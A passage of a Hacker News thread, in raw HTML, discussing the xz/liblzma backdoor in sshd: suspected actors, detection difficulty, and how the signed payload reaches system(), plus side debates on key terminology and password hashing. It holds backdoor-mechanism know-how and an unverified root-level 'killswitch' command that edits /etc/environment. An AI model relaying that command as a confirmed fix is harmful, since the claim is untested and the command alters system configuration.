quickly.<p>[1] <a href="https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39881465">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39881465</a></div><br/></div></div></div></div><div id="39880837" class="c"><input type="checkbox" id="c-39880837" checked=""/><div class="controls bullet"><span class="by">lobocinza</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879874">parent</a><span>|</span><a href="#39880524">prev</a><span>|</span><a href="#39880068">next</a><span>|</span><label class="collapse" for="c-39880837">[-]</label><label class="expand" for="c-39880837">[1 more]</label></div><br/><div class="children"><div class="content">Presumably this intelligence agency have multiple such initiatives and can afford to burn one to achieve a goal.</div><br/></div></div><div id="39880068" class="c"><input type="checkbox" id="c-39880068" checked=""/><div class="controls bullet"><span class="by">refulgentis</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879874">parent</a><span>|</span><a href="#39880837">prev</a><span>|</span><a href="#39881514">next</a><span>|</span><label class="collapse" for="c-39880068">[-]</label><label class="expand" for="c-39880068">[1 more]</label></div><br/><div class="children"><div class="content">No true Scotsman</div><br/></div></div></div></div></div></div><div id="39881514" class="c"><input type="checkbox" id="c-39881514" checked=""/><div class="controls bullet"><span class="by">cjbprime</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879223">parent</a><span>|</span><a href="#39879301">prev</a><span>|</span><a href="#39879514">next</a><span>|</span><label class="collapse" for="c-39881514">[-]</label><label class="expand" for="c-39881514">[1 more]</label></div><br/><div class="children"><div class="content">On the other hand, this was a two year long con..</div><br/></div></div></div></div><div id="39879514" class="c"><input type="checkbox" id="c-39879514" checked=""/><div class="controls bullet"><span class="by">vbezhenar</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878940">parent</a><span>|</span><a href="#39879223">prev</a><span>|</span><a href="#39879036">next</a><span>|</span><label class="collapse" for="c-39879514">[-]</label><label class="expand" for="c-39879514">[1 more]</label></div><br/><div class="children"><div class="content">&gt; But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show.<p>Think about backdoors that are already present and will never be found out.</div><br/></div></div><div id="39879036" class="c"><input type="checkbox" id="c-39879036" checked=""/><div class="controls bullet"><span class="by">chris_wot</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878940">parent</a><span>|</span><a href="#39879514">prev</a><span>|</span><a href="#39879197">next</a><span>|</span><label class="collapse" for="c-39879036">[-]</label><label class="expand" for="c-39879036">[7 more]</label></div><br/><div class="children"><div class="content">Surely this is something the FBI should be involved with? Or some authority?</div><br/><div id="39882141" class="c"><input type="checkbox" id="c-39882141" checked=""/><div class="controls bullet"><span class="by">t0mas88</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879036">parent</a><span>|</span><a href="#39879076">next</a><span>|</span><label class="collapse" for="c-39882141">[-]</label><label class="expand" for="c-39882141">[1 more]</label></div><br/><div class="children"><div class="content">Probably the FBI for the public part of it, but if this wasn&#x27;t a US owned operation you can be sure the CIA&#x2F;NSA&#x2F;military will do their own investigation.</div><br/></div></div><div id="39879076" class="c"><input type="checkbox" id="c-39879076" checked=""/><div class="controls bullet"><span class="by">colinsane</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879036">parent</a><span>|</span><a href="#39882141">prev</a><span>|</span><a href="#39879197">next</a><span>|</span><label class="collapse" for="c-39879076">[-]</label><label class="expand" for="c-39879076">[5 more]</label></div><br/><div class="children"><div class="content">sure. what makes you think they aren&#x27;t?</div><br/><div id="39879545" class="c"><input type="checkbox" id="c-39879545" checked=""/><div class="controls bullet"><span class="by">sitkack</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879076">parent</a><span>|</span><a href="#39879197">next</a><span>|</span><label class="collapse" for="c-39879545">[-]</label><label class="expand" for="c-39879545">[4 more]</label></div><br/><div class="children"><div class="content">Why would the FBI investigate the NSA? We have zero idea who the actors involved are.</div><br/><div id="39881622" class="c"><input type="checkbox" id="c-39881622" checked=""/><div class="controls bullet"><span class="by">pxc</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879545">parent</a><span>|</span><a href="#39879988">next</a><span>|</span><label class="collapse" for="c-39881622">[-]</label><label class="expand" for="c-39881622">[2 more]</label></div><br/><div class="children"><div class="content">It&#x27;s not actually unusual for three-letter US agencies to be at odds with one another.<p>But one possible reason is if the FBI is convinced that something the NSA is doing is illegal. They may not always be inclined to tolerate that.</div><br/><div id="39882445" class="c"><input type="checkbox" id="c-39882445" checked=""/><div class="controls bullet"><span class="by">sitkack</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881622">parent</a><span>|</span><a href="#39879988">next</a><span>|</span><label class="collapse" for="c-39882445">[-]</label><label class="expand" for="c-39882445">[1 more]</label></div><br/><div class="children"><div class="content">You would have to agree that it was possible for the government to break the law.  And what the repercussions are when that happens.</div><br/></div></div></div></div><div id="39879988" class="c"><input type="checkbox" id="c-39879988" checked=""/><div class="controls bullet"><span class="by">colinsane</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879545">parent</a><span>|</span><a href="#39881622">prev</a><span>|</span><a href="#39879197">next</a><span>|</span><label class="collapse" for="c-39879988">[-]</label><label class="expand" for="c-39879988">[1 more]</label></div><br/><div class="children"><div class="content">my comment allows for the NSA to be involved in this and for the FBI to not be investigating them.</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39879197" class="c"><input type="checkbox" id="c-39879197" checked=""/><div class="controls bullet"><span class="by">formerly_proven</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39878940">prev</a><span>|</span><a href="#39879764">next</a><span>|</span><label class="collapse" for="c-39879197">[-]</label><label class="expand" for="c-39879197">[3 more]</label></div><br/><div class="children"><div class="content">I think this would’ve been difficult to catch because the patching of sshd happens during linking, when it’s permissible, and if this is correct then it’s not a master key backdoor, so there is no regular login audit trail. And sshd would of course be allowed to start other processes. A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume.<p>As for being discovered outside the target, well we tried that exercise already, didn’t we? A bunch of people stared at the payload with valgrind et al and didn’t see it. It’s also fairly well protected from being discovered in debugging environments, because the overt infrastructure underlying the payload is incompatible with ASan and friends. And even if it is linked in, the code runs long before main(), so even if you were prodding around near or in liblzma with a debugger you wouldn’t normally observe it execute.<p>e: sibling suggests strace, yes you can see all syscalls after the process is spawned and you can watch the linker work. But from what I’ve gathered the payload isn’t making any syscalls at that stage to determine whether to activate, it’s just looking at argv and environ etc.</div><br/><div id="39881789" class="c"><input type="checkbox" id="c-39881789" checked=""/><div class="controls bullet"><span class="by">Deathcrow</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879197">parent</a><span>|</span><a href="#39879285">next</a><span>|</span><label class="collapse" for="c-39881789">[-]</label><label class="expand" for="c-39881789">[1 more]</label></div><br/><div class="children"><div class="content">&gt;A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume.<p>Huh, ssh executes things that aren&#x27;t shells all the time during normal operation. No? i.e. &#x27;ssh myserver.lan cat &#x2F;etc&#x2F;fstab&#x27;</div><br/></div></div><div id="39879285" class="c"><input type="checkbox" id="c-39879285" checked=""/><div class="controls bullet"><span class="by">tux3</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879197">parent</a><span>|</span><a href="#39881789">prev</a><span>|</span><a href="#39879764">next</a><span>|</span><label class="collapse" for="c-39879285">[-]</label><label class="expand" for="c-39879285">[1 more]</label></div><br/><div class="children"><div class="content">One idea may be to create a patched version of ld-linux itself with added sanity checks while the process loads.<p>For something much more heavy-handed, force the pages in sensitive sections to fault, either in the kernel or in a hypervisor. Then look at where the access is coming from in the page fault handler.<p>I don&#x27;t think you can reliably differentiate a backdoor executing a command, and a legitimate user logged in with ssh running a command once the backdoor is already installed. But the way backdoors install themselves is where they really break the rules.</div><br/></div></div></div></div></div></div><div id="39881018" class="c"><input type="checkbox" id="c-39881018" checked=""/><div class="controls bullet"><span class="by">sgammon</span><span>|</span><a href="#39878872">prev</a><span>|</span><a href="#39882268">next</a><span>|</span><label class="collapse" for="c-39881018">[-]</label><label class="expand" for="c-39881018">[3 more]</label></div><br/><div class="children"><div class="content">There appears to be a string encoded in the binary payload:<p><a href="https:&#x2F;&#x2F;gist.github.com&#x2F;q3k&#x2F;af3d93b6a1f399de28fe194add452d01#file-hashes-txt-L115" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;q3k&#x2F;af3d93b6a1f399de28fe194add452d01...</a><p>Which functions as a killswitch:<p><a href="https:&#x2F;&#x2F;piaille.fr&#x2F;@zeno&#x2F;112185928685603910" rel="nofollow">https:&#x2F;&#x2F;piaille.fr&#x2F;@zeno&#x2F;112185928685603910</a><p>If that is indeed the case, one mitigation might be<p>```<p>echo &quot;yolAbejyiejuvnup=Evjtgvsh5okmkAvj&quot; | sudo tee -a &#x2F;etc&#x2F;environment<p>```</div><br/><div id="39881432" class="c"><input type="checkbox" id="c-39881432" checked=""/><div class="controls bullet"><span class="by">sgammon</span><span>|</span><a href="#39881018">parent</a><span>|</span><a href="#39882208">next</a><span>|</span><label class="collapse" for="c-39881432">[-]</label><label class="expand" for="c-39881432">[1 more]</label></div><br/><div class="children"><div class="content">Make absolutely sure to include `-a` so it doesn&#x27;t nuke your env file, and generally speaking, one should upgrade to a version without the malicious code and restart, of course.</div><br/></div></div><div id="39882208" class="c"><input type="checkbox" id="c-39882208" checked=""/><div class="controls bullet"><span class="by">dannyw</span><span>|</span><a href="#39881018">parent</a><span>|</span><a href="#39881432">prev</a><span>|</span><a href="#39882268">next</a><span>|</span><label class="collapse" for="c-39882208">[-]</label><label class="expand" for="c-39882208">[1 more]</label></div><br/><div class="children"><div class="content">That&#x27;s so strange. This reeks of nation state actors, wanting ways to protect their own systems.</div><br/></div></div></div></div><div id="39882268" class="c"><input type="checkbox" id="c-39882268" checked=""/><div class="controls bullet"><span class="by">juliusdavies</span><span>|</span><a href="#39881018">prev</a><span>|</span><a href="#39878947">next</a><span>|</span><label class="collapse" for="c-39882268">[-]</label><label class="expand" for="c-39882268">[5 more]</label></div><br/><div class="children"><div class="content">Lucky the XZ license switched from &quot;Public Domain&quot; to 0BSD in February (just before these 5.6.0 and 5.6.1 releases)!<p>0BSD has no clauses, but it does have this:<p>&gt; IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.</div><br/><div id="39882330" class="c"><input type="checkbox" id="c-39882330" checked=""/><div class="controls bullet"><span class="by">perbu</span><span>|</span><a href="#39882268">parent</a><span>|</span><a href="#39878947">next</a><span>|</span><label class="collapse" for="c-39882330">[-]</label><label class="expand" for="c-39882330">[4 more]</label></div><br/><div class="children"><div class="content">Gross negligence and willfull misconduct cannot be waved away like this, in certain legislations, at least.</div><br/><div id="39882339" class="c"><input type="checkbox" id="c-39882339" checked=""/><div class="controls bullet"><span class="by">juliusdavies</span><span>|</span><a href="#39882268">root</a><span>|</span><a href="#39882330">parent</a><span>|</span><a href="#39878947">next</a><span>|</span><label class="collapse" for="c-39882339">[-]</label><label class="expand" for="c-39882339">[3 more]</label></div><br/><div class="children"><div class="content">Yes, but hopefully it does protect Lasse Collin.</div><br/><div id="39882586" class="c"><input type="checkbox" id="c-39882586" checked=""/><div class="controls bullet"><span class="by">broadsidepicnic</span><span>|</span><a href="#39882268">root</a><span>|</span><a href="#39882339">parent</a><span>|</span><a href="#39878947">next</a><span>|</span><label class="collapse" for="c-39882586">[-]</label><label class="expand" for="c-39882586">[2 more]</label></div><br/><div class="children"><div class="content">From what?</div><br/><div id="39882602" class="c"><input type="checkbox" id="c-39882602" checked=""/><div class="controls bullet"><span class="by">juliusdavies</span><span>|</span><a href="#39882268">root</a><span>|</span><a href="#39882586">parent</a><span>|</span><a href="#39878947">next</a><span>|</span><label class="collapse" for="c-39882602">[-]</label><label class="expand" for="c-39882602">[1 more]</label></div><br/><div class="children"><div class="content">Litigation including criminal prosecution</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39878947" class="c"><input type="checkbox" id="c-39878947" checked=""/><div class="controls bullet"><span class="by">chatmasta</span><span>|</span><a href="#39882268">prev</a><span>|</span><a href="#39880261">next</a><span>|</span><label class="collapse" for="c-39878947">[-]</label><label class="expand" for="c-39878947">[60 more]</label></div><br/><div class="children"><div class="content">Can someone explain succinctly what the backdoor <i>does</i>? Do we even know yet? The backdoor itself is not a payload, right? Does it need a malicious archive to exploit it? Or does it hook into the sshd process to listen for malicious packets from a remote attacker?<p>The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC?<p>Basically, how does an attacker control a machine with this backdoor on it?</div><br/><div id="39879082" class="c"><input type="checkbox" id="c-39879082" checked=""/><div class="controls bullet"><span class="by">swid</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879141">next</a><span>|</span><label class="collapse" for="c-39879082">[-]</label><label class="expand" for="c-39879082">[20 more]</label></div><br/><div class="children"><div class="content">You can imagine a door that opens if you knock on it just right.  For anyone without the secret knock, it appears and functions as a wall.  Without the secret knock, there might not even be a way to prove it opens at all.<p>This is sort of the situation here.  xz tries to decode some data before it does anything shady; since it is asymmetric; it can do the decryption without providing the secret encryption key (it has the public counterpart).<p>The exploit code may never be available, because it is not practical to find the secret key, and it doesn&#x27;t do anything obviously different if the payload doesn&#x27;t decrypt successfully.  The only way to produce the exploit code would be if the secret key is found somehow; and the only real way for that to happen would be for the people who developed the backdoor to leak it.</div><br/><div id="39880280" class="c"><input type="checkbox" id="c-39880280" checked=""/><div class="controls bullet"><span class="by">tialaramex</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879082">parent</a><span>|</span><a href="#39880626">next</a><span>|</span><label class="collapse" for="c-39880280">[-]</label><label class="expand" for="c-39880280">[11 more]</label></div><br/><div class="children"><div class="content"><i>Private</i> key. In cryptography we distinguish keys which are symmetric (needed by both parties and unavailable to everyone else) as &quot;Secret&quot; keys, with the pair of keys used in public key cryptography identified as the Private key (typically known only to one person&#x2F; system&#x2F; whatever) and Public key (known to anybody who cares)<p>Thus, in most of today&#x27;s systems today your password is a <i>secret</i>. You know your password and so does the system authenticating you. In contrast the crucial key for a web site&#x27;s HTTPS is <i>private</i>. Visitors don&#x27;t know this key, the people issuing the certificate don&#x27;t know it, only the site itself has the key.<p>I remember this by the lyrics to &quot;The Fly&quot; by the band U2, &quot;They say a secret is something you tell one other person. So I&#x27;m telling you, child&quot;.</div><br/><div id="39882032" class="c"><input type="checkbox" id="c-39882032" checked=""/><div class="controls bullet"><span class="by">forty</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880280">parent</a><span>|</span><a href="#39882131">next</a><span>|</span><label class="collapse" for="c-39882032">[-]</label><label class="expand" for="c-39882032">[2 more]</label></div><br/><div class="children"><div class="content">I have often seen the secret component of an asymmetric key pair referred as secret key as well. See libsodium for example. Maybe it&#x27;s because curve&#x2F;ed 25519 secrets are 32 random bytes unlike RSA keys which have specific structure which makes them distinct from generic secrets.</div><br/><div id="39882556" class="c"><input type="checkbox" id="c-39882556" checked=""/><div class="controls bullet"><span class="by">tux3</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39882032">parent</a><span>|</span><a href="#39882131">next</a><span>|</span><label class="collapse" for="c-39882556">[-]</label><label class="expand" for="c-39882556">[1 more]</label></div><br/><div class="children"><div class="content">It also allows &quot;pk&quot; and &quot;sk&quot; as overly short variable names, an argument developpers are sometimes tempted by!</div><br/></div></div></div></div><div id="39882131" class="c"><input type="checkbox" id="c-39882131" checked=""/><div class="controls bullet"><span class="by">kortilla</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880280">parent</a><span>|</span><a href="#39882032">prev</a><span>|</span><a href="#39880440">next</a><span>|</span><label class="collapse" for="c-39882131">[-]</label><label class="expand" for="c-39882131">[1 more]</label></div><br/><div class="children"><div class="content">Private keys are also “secrets” here in the security world.<p>“Vault secures, stores, and tightly controls access to tokens, passwords, certificates, API keys, and other secrets in modern computing”<p>Your distinction is not shared by the industry so it’s not something helpful to correct people on.</div><br/></div></div><div id="39880440" class="c"><input type="checkbox" id="c-39880440" checked=""/><div class="controls bullet"><span class="by">SV_BubbleTime</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880280">parent</a><span>|</span><a href="#39882131">prev</a><span>|</span><a href="#39880626">next</a><span>|</span><label class="collapse" for="c-39880440">[-]</label><label class="expand" for="c-39880440">[7 more]</label></div><br/><div class="children"><div class="content">&gt; You know your password and so does the system authenticating you.<p>Nitpick, but no it shouldn’t.<p>The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it.<p>The difference is that there is no two passwords that collide; but there are hashes that may.<p>And that two equal passwords from two equal users are not necessarily accessible to someone with the hash list because they are modified at rest with salts.</div><br/><div id="39880796" class="c"><input type="checkbox" id="c-39880796" checked=""/><div class="controls bullet"><span class="by">kevincox</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880440">parent</a><span>|</span><a href="#39881790">next</a><span>|</span><label class="collapse" for="c-39880796">[-]</label><label class="expand" for="c-39880796">[1 more]</label></div><br/><div class="children"><div class="content">To really nitpick the server does have the password during authentication. The alternate would be a PAKE which is currently quite rare. (But probably should become the standard)</div><br/></div></div><div id="39881790" class="c"><input type="checkbox" id="c-39881790" checked=""/><div class="controls bullet"><span class="by">AnonHP</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880440">parent</a><span>|</span><a href="#39880796">prev</a><span>|</span><a href="#39882341">next</a><span>|</span><label class="collapse" for="c-39881790">[-]</label><label class="expand" for="c-39881790">[3 more]</label></div><br/><div class="children"><div class="content">&gt; Nitpick, but no it shouldn’t.
The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it.<p>Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting).</div><br/><div id="39882157" class="c"><input type="checkbox" id="c-39882157" checked=""/><div class="controls bullet"><span class="by">armada651</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39881790">parent</a><span>|</span><a href="#39882341">next</a><span>|</span><label class="collapse" for="c-39882157">[-]</label><label class="expand" for="c-39882157">[2 more]</label></div><br/><div class="children"><div class="content">&gt; Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting).<p>I never understood why clients are coded this way. It&#x27;s trivially easy to send the salt to the client and have it do the hashing. Though I guess it doesn&#x27;t really improve security in a lot of cases, because if you successfully MITM a web app you can just serve a compromised client.</div><br/><div id="39882358" class="c"><input type="checkbox" id="c-39882358" checked=""/><div class="controls bullet"><span class="by">mr_mitm</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39882157">parent</a><span>|</span><a href="#39882341">next</a><span>|</span><label class="collapse" for="c-39882358">[-]</label><label class="expand" for="c-39882358">[1 more]</label></div><br/><div class="children"><div class="content">&gt; I never understood why clients are coded this way.<p>Because it makes things less secure. If it was sufficient to send the hash to the server to authenticate, and the server simply compares the hash sent by the user with the hash in its database, then the hash as actually the password. An attacker doesn&#x27;t need to know the password anymore, as the hash is sufficient.<p>Hashing was introduced precisely because some vulnerabilities allow read access to the database. With hashed passwords, the attacker in such a situation has to perform a password guessing attack first to proceed. If it was sufficient to send the hash for authentication, the attacker would not need to guess anything.</div><br/></div></div></div></div></div></div><div id="39882341" class="c"><input type="checkbox" id="c-39882341" checked=""/><div class="controls bullet"><span class="by">mr_mitm</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880440">parent</a><span>|</span><a href="#39881790">prev</a><span>|</span><a href="#39881283">next</a><span>|</span><label class="collapse" for="c-39882341">[-]</label><label class="expand" for="c-39882341">[1 more]</label></div><br/><div class="children"><div class="content">&gt; You never submit your password, you submit that hash and they compare it.<p>That&#x27;s not true. If that were the case, the hash is now the password and the server stores it in clear text. It defeats the entire purpose of hashing passwords.<p>Side note: that is (almost) how NTLM authentication works and why pass-the-hash is a thing in Windows networks.</div><br/></div></div><div id="39881283" class="c"><input type="checkbox" id="c-39881283" checked=""/><div class="controls bullet"><span class="by">jamwil</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880440">parent</a><span>|</span><a href="#39882341">prev</a><span>|</span><a href="#39880626">next</a><span>|</span><label class="collapse" for="c-39881283">[-]</label><label class="expand" for="c-39881283">[1 more]</label></div><br/><div class="children"><div class="content">More an implementation detail than a conceptual distinction, though.</div><br/></div></div></div></div></div></div><div id="39880626" class="c"><input type="checkbox" id="c-39880626" checked=""/><div class="controls bullet"><span class="by">takeda</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879082">parent</a><span>|</span><a href="#39880280">prev</a><span>|</span><a href="#39881541">next</a><span>|</span><label class="collapse" for="c-39880626">[-]</label><label class="expand" for="c-39880626">[1 more]</label></div><br/><div class="children"><div class="content">I could be wrong, buy my understanding is that it isn&#x27;t even a door. It simply allows anyone that has a certain private key, to send a payload that the server will execute. This won&#x27;t produce any audit of someone logging in, you won&#x27;t see any session etc.<p>Any Linux with this installed would basically become a bot that can be taken over. Perhaps they could send a payload to make it DDoS another host, or payload to open a shell or payload that would install another backdoor with more functionality, and to draw attention away from this one.</div><br/></div></div><div id="39881541" class="c"><input type="checkbox" id="c-39881541" checked=""/><div class="controls bullet"><span class="by">cjbprime</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879082">parent</a><span>|</span><a href="#39880626">prev</a><span>|</span><a href="#39880679">next</a><span>|</span><label class="collapse" for="c-39881541">[-]</label><label class="expand" for="c-39881541">[1 more]</label></div><br/><div class="children"><div class="content">It looks like the exploit path calls system() on attacker supplied input, if the check passes. I don&#x27;t think we need to go into more detail than &quot;it does whatever the attacker wants to on your computer, as root&quot;.</div><br/></div></div><div id="39880679" class="c"><input type="checkbox" id="c-39880679" checked=""/><div class="controls bullet"><span class="by">Nathanba</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879082">parent</a><span>|</span><a href="#39881541">prev</a><span>|</span><a href="#39879141">next</a><span>|</span><label class="collapse" for="c-39880679">[-]</label><label class="expand" for="c-39880679">[6 more]</label></div><br/><div class="children"><div class="content">I understand that we may never see the secret knock but shouldn&#x27;t we have the door and what&#x27;s behind it now? Doesn&#x27;t this mean that the code is quite literally too hard to figure out for a human being? It&#x27;s not like he can send a full new executable binary that he simply executes, then we&#x27;d see that the door is e.g the exec() call. Honestly this attempt makes me think that the entire c&#x2F;c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it&#x27;s possible because it&#x27;s written in c&#x2F;c++.</div><br/><div id="39881488" class="c"><input type="checkbox" id="c-39881488" checked=""/><div class="controls bullet"><span class="by">db48x</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880679">parent</a><span>|</span><a href="#39881445">next</a><span>|</span><label class="collapse" for="c-39881488">[-]</label><label class="expand" for="c-39881488">[1 more]</label></div><br/><div class="children"><div class="content">All analogies are flawed, and we are rapidly approaching the point of madness.<p>Still, let me try. In this case, someone on the inside of the building looked in a dusty closet and saw a strange pair of hinges on the wall of the closet. Turns out that the wall of the closet is an exterior wall adjoining the alley back behind the building! At least they know which contractor built this part of the building.<p>Further examination revealed the locking mechanism that keeps the secret door closed until the correct knock is used. But because the lock is based on the deep mathematics of prime numbers, no mere examination of the lock will reveal the pattern of locks that will open it. The best you could do is sit there and try every possible knocking pattern until the door opens, and that would take the rest of your life, plus the rest of the lifetime of the Earth itself as well.<p>Incidentally, I could write the same exploit in rust or any other safe language; no language can protect against a malicious programmer.<p>As for detecting use of the back door, that&#x27;s not entirely out of the question. However it sounds like it would not be as easy as logging every program that sshd calls exec on. But the audit subsystem should notice and record the activity for later use in your post–mortem investigation.</div><br/></div></div><div id="39881445" class="c"><input type="checkbox" id="c-39881445" checked=""/><div class="controls bullet"><span class="by">djao</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880679">parent</a><span>|</span><a href="#39881488">prev</a><span>|</span><a href="#39882004">next</a><span>|</span><label class="collapse" for="c-39881445">[-]</label><label class="expand" for="c-39881445">[1 more]</label></div><br/><div class="children"><div class="content">The payload is simply remote code execution. But we&#x27;ll never know the secret knock that triggers it, and we can&#x27;t probe existing servers for the flaw because we don&#x27;t konw the secret knock.<p>I imagine that we could in short order build ourselves a modified version of the malware, which contains a different secret knock, one that we know in advance, and then test what would have happened with the malware when the secret knock was given. But this still doesn&#x27;t help us probe existing servers for the flaw, because those servers aren&#x27;t running our modified version of the malware, they&#x27;re running the original malware.</div><br/></div></div><div id="39882004" class="c"><input type="checkbox" id="c-39882004" checked=""/><div class="controls bullet"><span class="by">Cloudef</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880679">parent</a><span>|</span><a href="#39881445">prev</a><span>|</span><a href="#39881484">next</a><span>|</span><label class="collapse" for="c-39882004">[-]</label><label class="expand" for="c-39882004">[1 more]</label></div><br/><div class="children"><div class="content">Nothing here is something that could not be done in other languages. For example in Rust auditing this kind of supply chain attack is even more nightmarish if the project uses crates, as crates often are very small causing the &quot;npm effect&quot;.<p>Another good example is docker images. The way people often build docker images is not that they are build all the way from the bottom. The bottom layer(s) is&#x2F;are often some arbitrary image from arbitrary source which causes a huge supply chain attack risk.</div><br/></div></div><div id="39881484" class="c"><input type="checkbox" id="c-39881484" checked=""/><div class="controls bullet"><span class="by">ivlad</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880679">parent</a><span>|</span><a href="#39882004">prev</a><span>|</span><a href="#39881549">next</a><span>|</span><label class="collapse" for="c-39881484">[-]</label><label class="expand" for="c-39881484">[1 more]</label></div><br/><div class="children"><div class="content">This is literally what the top post link is about. The backdoor functionality has been (roughly) figured out: after decryption and signature verification it passes the payload received in the signing key of the clients authentication certificate to system().<p>C&#x2F;C++ is not a problem here because sshd has to run things to open sessions for users.</div><br/></div></div><div id="39881549" class="c"><input type="checkbox" id="c-39881549" checked=""/><div class="controls bullet"><span class="by">creato</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39880679">parent</a><span>|</span><a href="#39881484">prev</a><span>|</span><a href="#39879141">next</a><span>|</span><label class="collapse" for="c-39881549">[-]</label><label class="expand" for="c-39881549">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Honestly this attempt makes me think that the entire c&#x2F;c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it&#x27;s possible because it&#x27;s written in c&#x2F;c++.<p>Nothing about this relies on a memory safety exploit. It&#x27;s hard to figure out because it&#x27;s a prebuilt binary and it&#x27;s clever. Unless you meant &quot;all compiled languages&quot; and not C&#x2F;C++ specifically, it&#x27;s irrelevant.<p>The right thing to argue against based on your instinct (no one can figure out what is going on) is: it should be unacceptable for there to be prebuilt binaries committed to the source code.</div><br/></div></div></div></div></div></div><div id="39879141" class="c"><input type="checkbox" id="c-39879141" checked=""/><div class="controls bullet"><span class="by">plg94</span><span>|</span><a href="#39878947">parent</a><span>|</span><a href="#39879082">prev</a><span>|</span><a href="#39879173">next</a><span>|</span><label class="collapse" for="c-39879141">[-]</label><label class="expand" for="c-39879141">[16 more]</label></div><br/><div class="children"><div class="content">I don&#x27;t think we know what exactly this does, yet. I can only answer one of those questions, as far as I understand the &quot;unreplayable&quot; part is refering to this:<p>&gt; Apparently the backdoor reverts back to regular operation if the payload is malformed or *the signature from the attacker&#x27;s key doesn&#x27;t verify*.<p>emphasis mine, note the &quot;signature of the attacker&#x27;s key&quot;. So unless that key is leaked, or someone breaks the RSA algorithm (in which case we have <i>far</i> bigger problems), it&#x27;s impossible for someone else (researcher or third-party) to exploit this backdoor.</div><br/><div id="39880021" class="c"><input type="checkbox" id="c-39880021" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879141">parent</a><span>|</span><a href="#39879780">next</a><span>|</span><label class="collapse" for="c-39880021">[-]</label><label class="expand" for="c-39880021">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s not using RSA.  It&#x27;s <i>hooking</i> RSA.  And the attacker&#x27;s signature is Ed448, not RSA.</div><br/></div></div><div id="39879780" class="c"><input type="checkbox" id="c-39879780" checked=""/><div class="controls bullet"><span class="by">rmi_</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879141">parent</a><span>|</span><a href="#39880021">prev</a><span>|</span><a href="#39879555">next</a><span>|</span><label class="collapse" for="c-39879780">[-]</label><label class="expand" for="c-39879780">[3 more]</label></div><br/><div class="children"><div class="content">&gt; So unless that key is leaked<p>But, just for replayability, we could &quot;patch&quot; the exploit with a known key and see what it does, don&#x27;t we?</div><br/><div id="39879883" class="c"><input type="checkbox" id="c-39879883" checked=""/><div class="controls bullet"><span class="by">swid</span><span>|</span><a href="#39878947">root</a><span>|</span><a href="#39879780">parent</a><span>|</span><a href="#39879555">next</a><span>|</span><label class="collapse" for="c-39879883">[-]</label><label class="expand" for="c-39879883">[2 more]</label></div><br/><div class="children"><div class="content">Replayability means something different in this context.  First, we do know the backdoor will pass the payload to system, so in general it is like an attacker has access to bash, presumably as root since it is sshd.<p>Replayability means, if someone were to catch a payload in action which did use the exploit, you can’t resend the attacker’s data and have it work.  It might contain something like a date or other data specific only to the context it came from.  This makes a recorded attack less helpful for developing a test… since you can’t replay it.</div><br/><div id="39880336" class="c"><input 